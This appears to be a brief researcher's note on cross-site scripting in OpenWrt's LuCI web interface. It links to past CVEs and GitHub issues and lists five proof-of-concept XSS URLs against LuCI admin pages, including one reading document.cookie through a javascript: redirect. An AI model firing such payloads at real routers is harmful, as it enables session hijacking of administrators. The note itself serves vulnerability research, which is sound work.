### past vuln

https://www.cvedetails.com/vulnerability-list/vendor_id-18578/Openwrt.html

https://openwrt.org/docs/guide-developer/security



### github issue
https://github.com/openwrt/luci/issues?q=is%3Aissue+xss+is%3Aclosed

https://github.com/openwrt/luci/issues?q=is%3Aissue+is%3Aclosed+security


``` html
http://xxxx/cgi-bin/luci/admin/;%3B<%2Fscript><script>alert%289232%29<%2Fscript>
http://192.168.56.2/cgi-bin/luci/admin/filebrowser/boot/grub%2500">`-alert(1)</script><script>` 
http://192.168.56.2/cgi-bin/luci/admin/filebrowser/boot/grub?field=')}}%0aalert(1)%0afunction%20a(path,input){if%20(true){//
http://192.168.56.2/cgi-bin/luci/admin/filebrowser/boot/grub?field=">`-alert`1`]]></script><svg><script>`<![CDATA[
http://ip-or-hostname/cgi-bin/luci/admin/uci/changes?redir=javascript:alert(document.cookie)

```